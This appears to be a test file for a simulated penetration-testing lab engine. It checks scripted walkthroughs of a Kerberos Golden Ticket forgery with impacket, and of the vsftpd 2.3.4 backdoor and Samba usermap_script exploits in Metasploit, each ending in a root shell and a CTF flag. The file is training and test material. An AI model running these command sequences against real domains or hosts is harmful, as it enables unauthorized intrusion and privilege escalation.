require('./register-typescript.cjs');
const assert = require('node:assert/strict');
const { LABS } = require('../src/data/labs.ts');
const { TerminalEngine } = require('../src/labs/engine.ts');

const lab = LABS.find((item) => item.slug === 'ad-golden-ticket-persistence');
assert.ok(lab, 'Golden Ticket lab must remain wired into the catalog');

const runLab = () => {
  const engine = new TerminalEngine(lab.scenario);
  const flags = [];
  const run = (command) => {
    const output = engine.run(command, (flag) => flags.push(flag));
    return { output, text: output.map((line) => line.text).join('\n') };
  };
  return { engine, flags, run };
};

const key = 'a9c2185f4d7032e681bd95a60c7f1438f09a12c5e6d7483b2f0a1c9d8e7f5634';
const sid = 'S-1-5-21-1357924680-2468013579-1029384756';
const base = `impacket-ticketer -aesKey ${key} -domain-sid ${sid} -domain CORP.LOCAL`;

{
  const { run } = runLab();
  const invalid = run(`impacket-ticketer -aesKey ${'0'.repeat(64)} -domain-sid ${sid} -domain CORP.LOCAL Administrator`);
  assert.match(invalid.text, /does not match the evidence/);
  assert.ok(invalid.output.some((line) => line.kind === 'error'));
}

{
  const { flags, run } = runLab();
  assert.match(run(`impacket-ticketer -aesKey ${key} -domain-sid ${sid} -domain CORP.LOCAL Administrator`).text, /no real ticket is generated/i);
  assert.match(run('cat Administrator.ccache').text, /not a Kerberos ticket or usable ccache/);
  assert.match(run('klist').text, /No usable credentials cache/);
  assert.match(run('export KRB5CCNAME=Administrator.ccache').text, /^$/);
  assert.match(run('klist').text, /Administrator@CORP\.LOCAL/);
  run(`${base} Analyst`);
  run('export KRB5CCNAME=Analyst.ccache');
  assert.match(run('impacket-psexec -k -no-pass -target-ip 10.10.107.3 CORP.LOCAL/Analyst@DC-CORP03.CORP.LOCAL').text, /not authorized to create a remote service/i);
  run('export KRB5CCNAME=Administrator.ccache');
  assert.match(run('impacket-psexec -k -no-pass -target-ip 10.10.107.3 CORP.LOCAL/Administrator@DC-CORP03.CORP.LOCAL').text, /remote service execution/);
  assert.match(run('whoami').text, /nt authority\\system/i);
  assert.match(run('cat /root/root.txt').text, /flag\{golden_ticket_krbtgt_forged_kerberos_auth\}/);
  assert.equal(flags.length, 1);
}

{
  const lab = LABS.find((item) => item.slug === 'net-ftp-backdoor');
  assert.ok(lab, 'Historical vsftpd lab must remain wired into the catalog');
  const engine = new TerminalEngine(lab.scenario);
  const run = (command) => engine.run(command, () => {});
  for (const command of [
    'nmap -sV -p 21 10.10.102.10',
    'msfconsole',
    'search vsftpd',
    'use exploit/unix/ftp/vsftpd_234_backdoor',
    'show options',
    'set RHOSTS 10.10.102.10',
    'run',
    'cat /root/root.txt',
  ]) {
    assert.ok(run(command).every((line) => line.kind !== 'error'), `${command} should work in the lab`);
  }
}

{
  const lab = LABS.find((item) => item.slug === 'msf-samba-usermap-domain-pivot');
  assert.ok(lab, 'Samba usermap lab must remain wired into the catalog');
  const flags = [];
  const engine = new TerminalEngine(lab.scenario);
  const run = (command) => {
    const output = engine.run(command, (flag) => flags.push(flag));
    assert.ok(output.every((line) => line.kind !== 'error'), `${command} should work in the lab`);
    return output.map((line) => line.text).join('\n');
  };
  run('nmap -sV -p 139,445 10.10.116.2');
  run('msfconsole');
  assert.match(run('search samba usermap_script'), /exploit\/multi\/samba\/usermap_script/);
  run('use exploit/multi/samba/usermap_script');
  assert.match(run('show options'), /RPORT\s+139/);
  run('set RHOSTS 10.10.116.2');
  run('run');
  assert.match(run('whoami'), /^root$/m);
  assert.match(run('cat /root/root.txt'), /flag\{samba_usermap_script_cve_2007_2447_unauth_root\}/);
  assert.equal(flags.length, 1);
}

console.log('Kerberos ticket and Metasploit lab paths passed, including negative authorization checks.');
